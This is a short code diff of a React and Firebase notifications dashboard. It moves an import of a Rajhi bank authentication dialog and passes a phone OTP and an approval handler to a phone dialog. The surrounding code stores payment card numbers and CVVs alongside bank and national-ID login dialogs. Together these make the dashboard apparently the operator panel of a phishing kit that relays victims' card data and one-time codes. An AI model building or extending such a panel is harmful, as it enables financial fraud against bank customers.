@@ -78,9 +78,10 @@ import {
 import { onAuthStateChanged, signOut } from "firebase/auth";
 import { auth, db } from "@/lib/firebase";
 import { Skeleton } from "@/components/ui/skeleton";
-import { RajhiAuthDialog } from "../components/rajhi";
 import { PhoneDialog } from "../components/phoen-info";
 import { NafazAuthDialog } from "../components/nafaz-auth";
+import { RajhiAuthDialog } from "../components/rajhi";
+
 interface PaymentData {
   card_number?: string;
   cvv?: string;
@@ -1703,9 +1704,11 @@ export default function NotificationsPage() {
       />
 
       <PhoneDialog
+        phoneOtp={selectedNotification?.phoneOtp}
         open={showPhoneDialog}
         onOpenChange={setPhoneDialog}
         notification={selectedNotification}
+        handleApproval={handleApproval}
       />
     </div>
   );
